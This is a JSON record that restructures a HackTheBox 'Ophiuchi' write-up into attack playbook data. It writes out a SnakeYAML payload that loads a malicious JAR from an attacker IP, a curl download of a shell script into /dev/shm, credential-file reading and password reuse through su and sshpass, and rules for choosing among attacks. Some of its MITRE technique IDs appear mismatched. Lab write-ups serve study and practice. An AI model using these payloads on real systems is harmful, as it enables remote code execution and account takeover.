@@ -1,0 +1,734 @@
+{
+  "writeup_id": "Htb_Ophiuchi",
+  "scenario_fingerprint": {
+    "scenario_name": "java_yaml_deserialization_tomcat",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+8080",
+    "service_combination": "ssh+tomcat",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "yaml_deserialization",
+    "privilege_path": "tomcat_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "snakeyaml_parser",
+      "java_deserialization",
+      "jar_payload_execution",
+      "scriptenginemanager_exploit"
+    ],
+    "environmental_clues": [
+      "tomcat_9_server",
+      "yaml_parsing_functionality",
+      "ubuntu_20_04_host",
+      "java_web_application"
+    ],
+    "similar_scenarios": [
+      "java_deserialization_boxes",
+      "tomcat_exploitation"
+    ],
+    "unique_aspects": [
+      "yaml_to_jar_payload",
+      "wasm_privilege_escalation",
+      "scriptenginemanager_vector"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "YAML_Deserialization",
+        "success_reason": "SnakeYAML parser processed malicious YAML without proper input validation",
+        "prerequisite_indicators": [
+          "java_application_present",
+          "yaml_parsing_functionality",
+          "snakeyaml_library_in_use",
+          "user_input_processed"
+        ],
+        "recognition_patterns": [
+          "YAML parser interface exposed",
+          "Java/Tomcat server stack",
+          "URLClassLoader payload triggers HTTP requests",
+          "META-INF/services requests indicate deserialization"
+        ],
+        "failure_modes": [
+          "input_validation_blocks_payloads",
+          "yaml_parser_sandboxed",
+          "network_egress_blocked",
+          "safe_yaml_library_used"
+        ],
+        "environmental_factors": [
+          "default_snakeyaml_configuration",
+          "no_deserialization_filters",
+          "network_egress_allowed",
+          "java_runtime_exec_available"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "JAR_Payload_Delivery",
+        "success_reason": "URLClassLoader successfully loaded and executed malicious JAR from remote server",
+        "prerequisite_indicators": [
+          "http_outbound_connectivity",
+          "java_classloader_accessible",
+          "scriptenginemanager_available"
+        ],
+        "recognition_patterns": [
+          "HTTP requests for JAR files",
+          "ScriptEngineFactory service loading",
+          "Constructor execution on class load",
+          "Multiple JAR download requests"
+        ],
+        "failure_modes": [
+          "outbound_http_blocked",
+          "classloader_restrictions",
+          "jar_execution_sandboxed"
+        ],
+        "environmental_factors": [
+          "unrestricted_classloader",
+          "constructor_execution_allowed",
+          "runtime_exec_permissions"
+        ],
+        "success_probability": 0.88,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "YAML deserialization vulnerability",
+        "discovery_method": "POC payload testing with URLClassLoader",
+        "why_critical": "Direct path to remote code execution on Java application",
+        "how_to_recognize": [
+          "YAML parsing interface exposed to users",
+          "Java/Tomcat application stack",
+          "HTTP requests triggered by deserialization payloads",
+          "META-INF service requests indicate vulnerable library"
+        ],
+        "follow_up_actions": [
+          "test_basic_urlclassloader_payload",
+          "setup_http_server_for_jar_hosting",
+          "compile_malicious_jar_payload",
+          "escalate_to_reverse_shell"
+        ]
+      },
+      {
+        "discovery": "SnakeYAML library in use",
+        "discovery_method": "Payload structure analysis and HTTP request patterns",
+        "why_critical": "Specific library known for deserialization vulnerabilities",
+        "how_to_recognize": [
+          "javax.script.ScriptEngineManager payload works",
+          "URLClassLoader instantiation successful",
+          "JAR file requests from application",
+          "Service loader pattern requests"
+        ],
+        "follow_up_actions": [
+          "craft_scriptenginemanager_payload",
+          "create_malicious_jar_with_constructor",
+          "test_command_execution_methods"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "remote_code_execution",
+        "escalation_method": "YAML_to_JAR_execution",
+        "why_possible": "Unsafe deserialization allows arbitrary class loading and execution",
+        "recognition_signs": [
+          "yaml_parser_accepts_complex_objects",
+          "urlclassloader_instantiation_allowed",
+          "remote_jar_loading_permitted",
+          "constructor_execution_unrestricted"
+        ],
+        "exploitation_path": "YAML payload → URLClassLoader → Remote JAR → Constructor execution → RCE"
+      },
+      {
+        "privilege_level": "application_user",
+        "escalation_method": "Java_Runtime_exec",
+        "why_possible": "Application runs with sufficient privileges for system command execution",
+        "recognition_signs": [
+          "runtime_getruntime_available",
+          "system_command_execution_works",
+          "network_connectivity_from_app",
+          "tomcat_user_permissions"
+        ],
+        "exploitation_path": "JAR constructor → Runtime.getRuntime().exec() → System commands → Reverse shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,8080 open on Linux host with Apache Tomcat 9.0.38",
+        "decision": "Identify as Java web application and test for deserialization vulnerabilities",
+        "reasoning": "Tomcat indicates Java backend, YAML parser suggests deserialization attack surface",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "directory_bruteforce",
+            "when": "if deserialization fails"
+          },
+          {
+            "option": "tomcat_manager_bruteforce",
+            "when": "if /manager accessible"
+          }
+        ],
+        "success_indicators": [
+          "yaml_parser_functionality_found",
+          "http_requests_to_external_urls",
+          "deserialization_poc_successful"
+        ],
+        "next_decision": "test_yaml_deserialization"
+      },
+      {
+        "step": 2,
+        "situation": "YAML parser found with potential deserialization vulnerability",
+        "decision": "Test SnakeYAML deserialization with URLClassLoader payload",
+        "reasoning": "Java YAML parsers commonly vulnerable to deserialization attacks",
+        "confidence": 0.85,
+        "prerequisites": [
+          "tomcat_server_identified",
+          "yaml_parser_accessible"
+        ],
+        "success_indicators": [
+          "external_http_request_received"
+        ],
+        "failure_fallbacks": [
+          "directory_enumeration",
+          "default_credentials",
+          "version_specific_exploits"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Deserialization POC successful - external HTTP requests confirmed",
+        "decision": "Create JAR payload for RCE instead of directory structure",
+        "reasoning": "JAR files are more reliable than individual class files for Java deserialization",
+        "confidence": 0.95,
+        "prerequisites": [
+          "deserialization_confirmed",
+          "java_compilation_available"
+        ],
+        "success_indicators": [
+          "jar_file_requested",
+          "command_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "try_directory_structure_payload",
+          "alternative_deserialization_gadgets"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_yaml_deserialization_works": {
+        "action": "create_rce_jar_payload",
+        "tools": [
+          "javac",
+          "jar",
+          "python_webserver"
+        ],
+        "next_phase": "reverse_shell_establishment"
+      },
+      "if_simple_reverse_shell_fails": {
+        "action": "use_staged_payload_approach",
+        "alternatives": [
+          "curl_download_then_execute",
+          "wget_download_then_execute"
+        ],
+        "decision_criteria": "java_runtime_exec_limitations"
+      },
+      "if_jar_payload_succeeds": {
+        "action": "establish_persistent_access",
+        "purpose": "gain_stable_shell_access",
+        "tools": [
+          "nc",
+          "bash",
+          "curl"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_yaml_deserialization_on_java_apps",
+        "reasoning": "high_success_rate_with_snakeyaml_library",
+        "applicability": "java_web_applications_with_yaml_parsing"
+      },
+      {
+        "rule": "use_jar_payloads_over_class_files_for_java_deserialization",
+        "reasoning": "more_reliable_loading_and_execution",
+        "applicability": "java_deserialization_attacks"
+      },
+      {
+        "rule": "use_staged_payloads_for_java_runtime_exec",
+        "reasoning": "java_runtime_exec_has_limitations_with_pipes_and_redirects",
+        "applicability": "java_command_execution_contexts"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Java YAML Deserialization",
+        "mitre_id": "T1055.012",
+        "required_services": [
+          "http",
+          "tomcat"
+        ],
+        "required_ports": [
+          8080,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "java_application_server",
+          "yaml_parser_present",
+          "snakeyaml_library_vulnerable",
+          "user_input_processed"
+        ],
+        "success_indicators": [
+          "http_request_to_external_url",
+          "jar_file_download_attempt",
+          "meta_inf_services_request",
+          "scriptenginemanager_instantiation"
+        ],
+        "incompatible_with": [
+          "yaml_parsing_disabled",
+          "input_sanitization_enabled",
+          "network_egress_blocked",
+          "java_security_manager_strict"
+        ],
+        "confidence_boosters": [
+          "tomcat_server_detected",
+          "yaml_parsing_functionality_visible",
+          "java_stack_traces_visible",
+          "default_tomcat_configuration"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Directory Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "directory_listing_disabled",
+          "hidden_directories_present"
+        ],
+        "success_indicators": [
+          "status_200_responses",
+          "status_302_redirects",
+          "content_length_variations",
+          "response_time_differences"
+        ],
+        "incompatible_with": [
+          "rate_limiting_aggressive",
+          "waf_blocking_requests",
+          "ip_blocking_enabled"
+        ],
+        "confidence_boosters": [
+          "standard_web_server_detected",
+          "default_installation_paths",
+          "common_cms_patterns"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "java_application_server": {
+        "port_indicators": [
+          8080,
+          8443,
+          9080,
+          9443
+        ],
+        "service_indicators": [
+          "tomcat",
+          "jetty",
+          "jboss",
+          "websphere"
+        ],
+        "banner_indicators": [
+          "Apache Tomcat",
+          "Java",
+          "JSP"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis",
+          "tomcat"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "yaml_parser": {
+        "port_indicators": [
+          80,
+          443,
+          8080
+        ],
+        "service_indicators": [
+          "http"
+        ],
+        "content_indicators": [
+          "yaml",
+          "parse",
+          "snakeyaml"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "yaml_deserialization",
+          "when": "java_server_and_yaml_parser_detected",
+          "reason": "high_impact_rce_potential"
+        },
+        {
+          "attack": "tomcat_manager_bruteforce",
+          "when": "tomcat_manager_accessible",
+          "reason": "direct_code_execution_if_successful"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reveals_hidden_functionality_and_paths"
+        },
+        {
+          "attack": "default_credential_testing",
+          "when": "admin_interfaces_detected",
+          "reason": "quick_wins_on_default_configs"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Java YAML Deserialization",
+        "mitre_id": "T1203",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "yaml-payload",
+            "command_template": "javac src/artsploit/AwesomeScriptEngineFactory.java && jar -cvf {payload}.jar -C src/ .",
+            "actual_command": "javac src/artsploit/AwesomeScriptEngineFactory.java && jar -cvf rev.jar -C src/ .",
+            "output_pattern": "JAR file with malicious ScriptEngineFactory",
+            "effectiveness_rating": 5,
+            "reliability": 0.92
+          },
+          {
+            "name": "curl",
+            "command_template": "curl http://{attacker_ip}/{shell_script} -o /dev/shm/.s.sh",
+            "actual_command": "curl http://10.10.14.7/shell.sh -o /dev/shm/.s.sh",
+            "success_factors": [
+              "outbound_http_allowed",
+              "writable_temp_directory"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "snakeyaml_parser_accessible",
+          "java_runtime_available",
+          "outbound_network_connectivity"
+        ],
+        "success_indicators": [
+          "jar_file_requested_from_server",
+          "reverse_shell_connection_established",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "java_security_manager_blocking_execution",
+          "network_egress_filtering",
+          "insufficient_permissions_for_temp_file_creation"
+        ],
+        "follow_up_techniques": [
+          "credential_harvesting",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Credential Reuse Attack",
+        "mitre_id": "T1078.003",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "su",
+            "command_template": "su {username} -",
+            "actual_command": "su admin -",
+            "output_pattern": "Password prompt and successful shell",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "sshpass",
+            "command_template": "sshpass -p \"{password}\" ssh {username}@{target_ip}",
+            "actual_command": "sshpass -p \"whythereisalimit\" ssh admin@10.10.10.227",
+            "success_factors": [
+              "password_reuse",
+              "ssh_service_accessible"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "configuration_file_access",
+          "weak_password_practices",
+          "multiple_service_accounts"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "elevated_user_privileges",
+          "access_to_user_home_directory"
+        ],
+        "common_failures": [
+          "unique_passwords_per_service",
+          "account_lockout_policies",
+          "multi_factor_authentication"
+        ],
+        "follow_up_techniques": [
+          "sudo_enumeration",
+          "file_system_enumeration",
+          "further_privilege_escalation"
+        ],
+        "time_investment": "2-10 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "yaml-payload",
+        "use_case": "java_yaml_deserialization_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.92,
+        "learning_curve": "medium",
+        "essential_for": [
+          "java_web_applications",
+          "snakeyaml_parsers"
+        ],
+        "alternatives": [
+          "marshalsec",
+          "manual_jar_creation"
+        ],
+        "best_practices": [
+          "use_staged_payload_approach_for_complex_commands",
+          "avoid_pipes_and_redirects_in_runtime_exec",
+          "test_with_simple_commands_first"
+        ]
+      },
+      {
+        "tool": "gobuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.88,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "dirb"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists_for_technology_stack",
+          "include_common_extensions_for_platform",
+          "adjust_thread_count_based_on_target_stability"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "yaml_deserialization_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://10.10.14.7/\"]]]]",
+            "purpose": "Test for YAML deserialization vulnerability",
+            "expected_output": "HTTP request to attacker server"
+          },
+          {
+            "step": 2,
+            "command": "javac src/artsploit/AwesomeScriptEngineFactory.java",
+            "purpose": "Compile malicious Java payload",
+            "expected_output": "Compiled .class file"
+          },
+          {
+            "step": 3,
+            "command": "jar -cvf rev.jar -C src/ .",
+            "purpose": "Package payload into JAR file",
+            "expected_output": "JAR file with embedded payload"
+          },
+          {
+            "step": 4,
+            "command": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://10.10.14.7/rev.jar\"]]]]",
+            "purpose": "Trigger deserialization with malicious JAR",
+            "expected_output": "Reverse shell connection"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "20-60 minutes"
+      },
+      {
+        "sequence_name": "credential_reuse_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "cat /opt/tomcat/conf/tomcat-users.xml",
+            "purpose": "Extract Tomcat credentials",
+            "expected_output": "Username and password in XML format"
+          },
+          {
+            "step": 2,
+            "command": "su admin -",
+            "purpose": "Attempt credential reuse for privilege escalation",
+            "expected_output": "Successful authentication as admin user"
+          },
+          {
+            "step": 3,
+            "command": "cat user.txt",
+            "purpose": "Retrieve user flag",
+            "expected_output": "User flag hash"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "5-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Ophiuchi",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu 20.04",
+      "platform": "HackTheBox",
+      "release_date": "2021-02-13",
+      "author": "felamos",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "deserialization",
+        "yaml_injection",
+        "webassembly"
+      ],
+      "key_vulnerabilities": [
+        "java_yaml_deserialization",
+        "sudo_misconfiguration"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "deserialization_attacks",
+        "jar_payload_creation",
+        "wasm_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "java_fundamentals",
+        "serialization_concepts",
+        "web_assembly_basics"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "deserialization",
+        "privilege_escalation",
+        "webassembly"
+      ],
+      "attack_types": [
+        "code_injection",
+        "privilege_escalation",
+        "remote_code_execution"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "deserialization_security",
+        "sudo_hardening"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Arkham",
+        "Tabby",
+        "Jeeves"
+      ],
+      "similarity_reasons": [
+        "java_exploitation",
+        "tomcat_server",
+        "deserialization_attacks"
+      ],
+      "unique_aspects": [
+        "yaml_deserialization",
+        "wasm_privilege_escalation",
+        "jar_payload_injection"
+      ],
+      "difficulty_factors": [
+        "complex_payload_generation",
+        "webassembly_knowledge",
+        "multi_stage_exploitation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T01:06:30.153434",
+    "original_file": "0xdf_writeups/Htb Ophiuchi.md",
+    "content_length": 22635,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
